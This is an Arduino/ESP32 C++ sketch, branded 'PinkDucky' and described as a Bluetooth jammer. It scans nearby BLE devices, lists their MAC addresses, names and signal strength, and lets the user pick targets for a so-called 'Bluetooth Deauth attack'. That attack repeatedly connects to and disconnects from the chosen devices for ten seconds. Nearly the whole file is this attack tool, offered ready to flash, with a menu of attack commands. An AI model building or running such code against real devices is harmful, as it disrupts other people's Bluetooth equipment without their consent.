#ifndef SOC_BLE_50_SUPPORTED
#warning "This SoC does not support BLE5. Try using ESP32-C3, or ESP32-S3"
#else

#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <vector>

int macCount = 0;
bool bluetoothScan = false;
bool bluetoothDeauth = false;

unsigned long deauthStartTime = 0;
bool deauthActive = false;
const unsigned long deauthDuration = 10 * 1000;  // 10 seconds

std::vector<String> foundMacs;
std::vector<String> allMacs; // backup of original list

// BLE SCAN CALLBACKS
class MyAdvertisedDeviceCallbacks : public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice advertisedDevice) {
    String mac = advertisedDevice.getAddress().toString().c_str();
    String name = advertisedDevice.getName().c_str();

    if (std::find(foundMacs.begin(), foundMacs.end(), mac) == foundMacs.end()) {
      foundMacs.push_back(mac);
      macCount++;

      Serial.print("[+] Found Device: ");
      Serial.print(mac);
      
      if (name.length() > 0) {
        Serial.print("  Name: ");
        Serial.print(name);
      } else {
        Serial.print("  Name: <Unknown>");
      }

      Serial.printf("  RSSI: %d dBm", advertisedDevice.getRSSI());

      if (advertisedDevice.haveTXPower()) {
        Serial.printf("  TX Power: %d", advertisedDevice.getTXPower());
      }
      if (advertisedDevice.haveServiceUUID()) {
        Serial.print("  Service UUID: ");
        Serial.print(advertisedDevice.getServiceUUID().toString().c_str());
      }

      Serial.println();

      allMacs = foundMacs; // update backup list
    }
  }
};

// LIST DEVICES
void listMac() {
  Serial.println("\n[MAC LIST]");
  for (size_t i = 0; i < foundMacs.size(); ++i) {
    Serial.printf("%2d: %s\n", i + 1, foundMacs[i].c_str());
  }
  if (!foundMacs.empty()) {
    Serial.println(" 0: Restore all MACs");
  }
}

// PLACEHOLDER FOR SAVING
void saveData() {
  Serial.println("[*] Save logic not implemented yet.");
}

// WIPE LIST
void wipeData() {
  foundMacs.clear();
  allMacs.clear();
  macCount = 0;
  Serial.println("[*] MAC list wiped.");
}

// MENU
void showMenu() {
  Serial.println(F(" ESP32-C3 Super Mini Bluetooth Jammer aka [PinkDucky]"));
  Serial.println(F(" _________________________"));
  Serial.println(F("|     ESP32-C3 Super     |"));
  Serial.println(F("|      Mini Board        |  🦆 PinkDucky 🦆 "));
  Serial.println(F("|------------------------|      BadDuck"));
  Serial.println(F("| [ ] EN           IO10  |"));
  Serial.println(F("| [ ] 3V3          IO6   |"));
  Serial.println(F("| [ ] IO0          IO7   |"));
  Serial.println(F("| [ ] GND          IO5   |"));
  Serial.println(F("| [ ] IO1          IO4   |"));
  Serial.println(F("| [ ] IO2          IO3   |"));
  Serial.println(F("| [ ] IO8          GND   |"));
  Serial.println(F("| [ ] IO9          5V    |"));
  Serial.println(F("|------------------------|"));
  Serial.println(F("|__USB-C__    __RST BTN__|"));
  Serial.println(F("[s] Start/Stop Bluetooth scan"));
  Serial.println(F("[l] List found MACs"));
  Serial.println(F("[w] Save MACs (not implemented)"));
  Serial.println(F("[x] Wipe MAC list"));
  Serial.println(F("[t] Select a Target Device for 🦆 Deauth Attack"));
  Serial.println(F("[a] Toggle 🦆 Bluetooth Deauth Attack 🦆"));
  Serial.println(F("[m] Show menu again"));
}

// USER INPUT HANDLER
void handleMenuInput(char input) {
  switch (input) {
    case 'l':
      listMac();
      break;
    case 'w':
      saveData();
      break;
    case 'x':
      wipeData();
      break;
    case 't': {
      if (foundMacs.empty()) {
        Serial.println("[!] No MACs to choose from. Run a scan first.");
        break;
      }

      listMac();
      Serial.println("Enter index number of MAC to attack (or 0 to restore full list):");
      while (!Serial.available());
      int index = Serial.parseInt();

      while (Serial.available()) Serial.read(); // clear buffer

      if (index == 0) {
        foundMacs = allMacs;
        Serial.println("[*] Restored full MAC list.");
      } else if (index > 0 && index <= foundMacs.size()) {
        String targetMac = foundMacs[index - 1];
        Serial.print("[*] Targeting only: ");
        Serial.println(targetMac);
        foundMacs.clear();
        foundMacs.push_back(targetMac);
      } else {
        Serial.println("[!] Invalid selection.");
      }
      break;
    }
    case 'a':
      if (!deauthActive) {
        if (foundMacs.empty()) {
          Serial.println("[!] No devices found. Start a scan first!");
          break;
        }

        Serial.print("[*] Starting Bluetooth Deauth attack for ");
        Serial.print(deauthDuration / 1000);
        Serial.println(" seconds...");
        Serial.println("[*] Targets:");
        for (String mac : foundMacs) {
          Serial.println("    → " + mac);
        }
        deauthStartTime = millis();
        deauthActive = true;
      } else {
        deauthActive = false;
        Serial.println("[*] Bluetooth Deauth attack stopped.");
      }
      break;
    case 's':
      bluetoothScan = !bluetoothScan;
      Serial.print("[*] Scan ");
      Serial.println(bluetoothScan ? "enabled" : "disabled");
      break;
    case 'm':
      showMenu();
      break;
    default:
      Serial.println("? Unknown command. Type 'm' for menu.");
      break;
  }
}

// PERFORM BLE SCAN
void performBluetoothScan() {
  BLEScan* pBLEScan = BLEDevice::getScan();
  pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
  pBLEScan->setActiveScan(true);
  pBLEScan->setInterval(80);
  pBLEScan->setWindow(80);
  pBLEScan->start(10, false);
  delay(10000);
  BLEScan* scan = BLEDevice::getScan();
  scan->setActiveScan(true);
  scan->start(5);
  delay(500);
}

// PERFORM BLE DEAUTH
void performBluetoothDeauth() {
  for (String mac : foundMacs) {
    BLEAddress deviceAddress(mac.c_str());
    BLEClient* client = BLEDevice::createClient();

    Serial.print("[!] Attacking ");
    Serial.println(mac);

    if (client->connect(deviceAddress)) {
      delay(500);
      client->disconnect();
    }

    delete client;
    delay(250);
  }
}

void setup() {
  Serial.begin(115200);
  delay(100);
  Serial.flush();
  Serial.println("Setting up PinkDucky...");
  BLEDevice::init("PinkDucky");
  delay(400);
  showMenu();
}

void loop() {
  if (Serial.available()) {
    char input = Serial.read();
    if (input == '\n' || input == '\r') return;
    handleMenuInput(input);
  }

  if (bluetoothScan) {
    performBluetoothScan();
  }

  if (deauthActive) {
    if (millis() - deauthStartTime < deauthDuration) {
      performBluetoothDeauth();
    } else {
      deauthActive = false;
      Serial.println("[*] Bluetooth Deauth attack finished.");
    }
  }
}

#endif  // SOC_BLE_50_SUPPORTED
